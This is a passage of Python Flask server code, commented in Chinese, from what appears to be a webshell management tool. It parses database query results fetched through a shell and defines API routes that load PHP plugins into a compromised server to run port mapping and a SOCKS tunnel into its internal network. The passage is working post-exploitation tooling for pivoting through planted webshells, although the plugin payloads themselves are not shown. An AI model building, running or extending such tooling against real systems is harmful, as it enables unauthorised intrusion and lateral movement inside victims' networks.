        if not column_names:
            return []
        
        # 解析数据行
        result_rows = []
        for line_index in range(1, len(lines)):
            line = lines[line_index].strip()
            if not line:
                continue
            
            # 按制表符分割并解码Base64
            raw_values = line.split('\t')
            row_data = {}
            
            for i, raw_value in enumerate(raw_values):
                if i < len(column_names):
                    column_name = column_names[i]
                    
                    if raw_value.strip():
                        try:
                            # 尝试Base64解码
                            import base64
                            decoded_value = base64.b64decode(raw_value.strip()).decode('utf-8')
                            row_data[column_name] = decoded_value
                        except Exception:
                            # 如果解码失败，直接使用原始值
                            row_data[column_name] = raw_value.strip()
                    else:
                        row_data[column_name] = ''
            
            result_rows.append(row_data)
        
        print(f"[DEBUG] 解析查询结果成功: {len(result_rows)} 行, 列: {column_names}")
        return result_rows
        
    except Exception as e:
        print(f"[ERROR] 解析数据库查询结果失败: {e}")
        print(f"[DEBUG] 原始数据: {result_data[:500]}...")
        raise e


# ====== 内网穿透 - 端口映射接口 ======

@php_shell_bp.route('/startPortMapping', methods=['POST'])
def start_port_mapping():
    """启动端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        local_port = data.get('localPort')
        target_ip = data.get('targetIp')
        target_port = data.get('targetPort')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not local_port:
            return jsonify({'status': 'error', 'message': '本地端口不能为空'}), 400
        if not target_ip:
            return jsonify({'status': 'error', 'message': '目标IP不能为空'}), 400
        if not target_port:
            return jsonify({'status': 'error', 'message': '目标端口不能为空'}), 400
        
        print(f"[INFO] 启动PHP端口映射: {local_port} -> {target_ip}:{target_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 加载端口映射插件
        payload = phpPayload()
        plugin_code = payload.getPayload("PortMappingService", None)
        
        if not shell._include("PortMappingService", plugin_code):
            return jsonify({'status': 'error', 'message': '加载端口映射插件失败'}), 500
        
        # 导入并启动端口映射服务
        from .php.PortMappingService import PortMappingService
        
        mapping_service = PortMappingService(
            shell=shell,
            local_port=local_port,
            target_ip=target_ip,
            target_port=target_port
        )
        
        if not mapping_service.start():
            return jsonify({'status': 'error', 'message': '端口映射服务启动失败'}), 500
        
        # 保存服务实例到全局缓存（使用 webshell_id 作为 key）
        if not hasattr(start_port_mapping, 'mapping_services'):
            start_port_mapping.mapping_services = {}
        
        mapping_key = f"{webshell_id}_{local_port}"
        start_port_mapping.mapping_services[mapping_key] = mapping_service
        
        return jsonify({
            'status': 'success',
            'message': '端口映射启动成功',
            'data': {
                'mapping': f"{local_port} -> {target_ip}:{target_port}",
                'local_port': local_port,
                'target_ip': target_ip,
                'target_port': target_port
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/stopPortMapping', methods=['POST'])
def stop_port_mapping():
    """停止指定的端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        local_port = data.get('localPort')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not local_port:
            return jsonify({'status': 'error', 'message': '本地端口不能为空'}), 400
        
        print(f"[INFO] 停止PHP端口映射: {local_port}")
        
        # 从缓存中获取服务实例
        if not hasattr(start_port_mapping, 'mapping_services'):
            return jsonify({'status': 'error', 'message': '未找到运行中的端口映射'}), 404
        
        mapping_key = f"{webshell_id}_{local_port}"
        
        if mapping_key not in start_port_mapping.mapping_services:
            return jsonify({'status': 'error', 'message': f'端口 {local_port} 的映射不存在'}), 404
        
        # 停止服务
        mapping_service = start_port_mapping.mapping_services[mapping_key]
        mapping_service.stop()
        
        # 从缓存中移除
        del start_port_mapping.mapping_services[mapping_key]
        
        return jsonify({
            'status': 'success',
            'message': f'端口映射已停止',
            'data': {
                'local_port': local_port
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/getPortMappingStatus', methods=['POST'])
def get_port_mapping_status():
    """获取端口映射状态"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        # 获取该 webshell 的所有端口映射
        mappings = []
        
        if hasattr(start_port_mapping, 'mapping_services'):
            for mapping_key, mapping_service in start_port_mapping.mapping_services.items():
                # 检查是否属于当前 webshell
                if mapping_key.startswith(f"{webshell_id}_"):
                    mappings.append({
                        'mapping_id': mapping_key,
                        'local_port': mapping_service.local_port,
                        'target': f"{mapping_service.target_ip}:{mapping_service.target_port}",
                        'connection_count': mapping_service.connection_count,
                        'bytes_sent': mapping_service.total_bytes_sent,
                        'bytes_received': mapping_service.total_bytes_received
                    })
        
        return jsonify({
            'status': 'success',
            'message': '获取端口映射状态成功',
            'data': {
                'total_mappings': len(mappings),
                'mappings': mappings
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/stopAllPortMappings', methods=['POST'])
def stop_all_port_mappings():
    """停止所有端口映射"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        print(f"[INFO] 停止所有PHP端口映射 (webshell_id: {webshell_id})")
        
        stopped_count = 0
        
        if hasattr(start_port_mapping, 'mapping_services'):
            # 找到所有属于该 webshell 的映射
            keys_to_remove = []
            
            for mapping_key, mapping_service in start_port_mapping.mapping_services.items():
                if mapping_key.startswith(f"{webshell_id}_"):
                    mapping_service.stop()
                    keys_to_remove.append(mapping_key)
                    stopped_count += 1
            
            # 从缓存中移除
            for key in keys_to_remove:
                del start_port_mapping.mapping_services[key]
        
        return jsonify({
            'status': 'success',
            'message': f'已停止 {stopped_count} 个端口映射',
            'data': {
                'stopped_count': stopped_count
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


# ====== 内网穿透 - SOCKS隧道接口 ======

@php_shell_bp.route('/startSocksTunnel', methods=['POST'])
def start_socks_tunnel():
    """启动SOCKS隧道"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        listen_port = data.get('listenPort')
        listen_ip = data.get('listenIp', '127.0.0.1')
        ip_whitelist = data.get('ipWhitelist', [])
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not listen_port:
            return jsonify({'status': 'error', 'message': '监听端口不能为空'}), 400
        
        print(f"[INFO] 启动PHP SOCKS隧道: {listen_ip}:{listen_port}")
        if ip_whitelist:
            print(f"[INFO] IP白名单: {ip_whitelist}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 加载SOCKS代理插件
        payload = phpPayload()
        plugin_code = payload.getPayload("SocksProxy", None)
        
        if not shell._include("SocksProxy", plugin_code):
            return jsonify({'status': 'error', 'message': '加载SOCKS代理插件失败'}), 500
        
        # 导入并启动SOCKS服务
        from .php.SocksService import SocksService
        
        socks_service = SocksService(
            shell=shell,
            listen_ip=listen_ip,
            listen_port=listen_port,
            ip_whitelist=ip_whitelist
        )
        
        if not socks_service.start():
            return jsonify({'status': 'error', 'message': 'SOCKS隧道启动失败'}), 500
        
        # 保存服务实例到全局缓存
        if not hasattr(start_socks_tunnel, 'socks_services'):
            start_socks_tunnel.socks_services = {}
        
        socks_key = f"{webshell_id}"
        start_socks_tunnel.socks_services[socks_key] = socks_service
        
        return jsonify({
            'status': 'success',
            'message': 'SOCKS隧道启动成功',
            'data': {
                'proxy': f"{listen_ip}:{listen_port}",
                'listen_ip': listen_ip,
                'listen_port': listen_port,
                'whitelist_enabled': len(ip_whitelist) > 0,
                'whitelist': ip_whitelist
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/stopSocksTunnel', methods=['POST'])
def stop_socks_tunnel():
    """停止SOCKS隧道"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        print(f"[INFO] 停止PHP SOCKS隧道 (webshell_id: {webshell_id})")
        
        # 从缓存中获取服务实例
        if not hasattr(start_socks_tunnel, 'socks_services'):
            return jsonify({'status': 'error', 'message': '未找到运行中的SOCKS隧道'}), 404
        
        socks_key = f"{webshell_id}"
        
        if socks_key not in start_socks_tunnel.socks_services:
            return jsonify({'status': 'error', 'message': 'SOCKS隧道不存在'}), 404
        
        # 停止服务
        socks_service = start_socks_tunnel.socks_services[socks_key]
        socks_service.stop()
        
        # 从缓存中移除
        del start_socks_tunnel.socks_services[socks_key]
        
        return jsonify({
            'status': 'success',
            'message': 'SOCKS隧道已停止'
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/getSocksTunnelStatus', methods=['POST'])
def get_socks_tunnel_status():
    """获取SOCKS隧道状态"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        socks_key = f"{webshell_id}"
        
        # 检查服务是否存在
        if (not hasattr(start_socks_tunnel, 'socks_services') or 
            socks_key not in start_socks_tunnel.socks_services):
            return jsonify({
                'status': 'success',
                'message': 'SOCKS隧道未运行',
                'data': {
                    'isRunning': False,
                    'listenIp': None,
                    'listenPort': None,
                    'activeConnections': 0
                }
            })
        
        # 获取服务实例
        socks_service = start_socks_tunnel.socks_services[socks_key]
        
        return jsonify({
            'status': 'success',
            'message': 'SOCKS隧道状态获取成功',
            'data': {
                'isRunning': socks_service.is_running,
                'listenIp': socks_service.listen_ip,
                'listenPort': socks_service.listen_port,
                'activeConnections': socks_service.connection_count,
                'totalBytesSent': socks_service.total_bytes_sent,
                'totalBytesReceived': socks_service.total_bytes_received
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/updateSocksWhitelist', methods=['POST'])
def update_socks_whitelist():
    """更新SOCKS隧道IP白名单"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        ip_whitelist = data.get('ipWhitelist', [])
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        print(f"[INFO] 更新PHP SOCKS隧道白名单: {ip_whitelist}")
        
        socks_key = f"{webshell_id}"
        
        # 检查服务是否存在
        if (not hasattr(start_socks_tunnel, 'socks_services') or 
            socks_key not in start_socks_tunnel.socks_services):
            return jsonify({'status': 'error', 'message': 'SOCKS隧道未运行'}), 404
        
        # 获取服务实例
        socks_service = start_socks_tunnel.socks_services[socks_key]
        
        # 更新白名单
        socks_service.ip_whitelist = ip_whitelist
        
        return jsonify({
            'status': 'success',
            'message': 'IP白名单更新成功',
            'data': {
                'whitelist': ip_whitelist,
                'whitelist_count': len(ip_whitelist)
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

